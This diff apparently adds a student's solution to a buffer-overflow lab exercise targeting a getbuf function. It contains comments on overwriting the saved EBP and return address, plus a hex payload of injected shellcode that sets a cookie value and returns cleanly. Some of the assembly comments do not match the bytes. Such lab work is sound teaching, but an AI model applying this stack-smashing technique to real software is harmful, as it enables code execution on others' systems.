@@ -1,0 +1,9 @@
+/* use gdb to get the EBP value before getbuf() process: 0x55683560 */
+/* So I need use 0x55683560(can't be arbitrary) to cover the old EBP value of the attack stack frame */
+/* I need to use buf prior address to cover the return address(the same as level 2) to execute my attack code */
+/* after getbuf function, the right return address is 0x08048e81 */
+/* movl    $0x118e7330, 0x0804c218 */
+/* pushl   $0x08048d05 */
+/* ret */
+/* Then my attack assemble code can pass the cookie 0x118e7330 to %eax, and pushl 0x08048e81 to return right */
+b8 30 73 8e 11 68 81 8e 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60 35 68 55 08 35 68 55
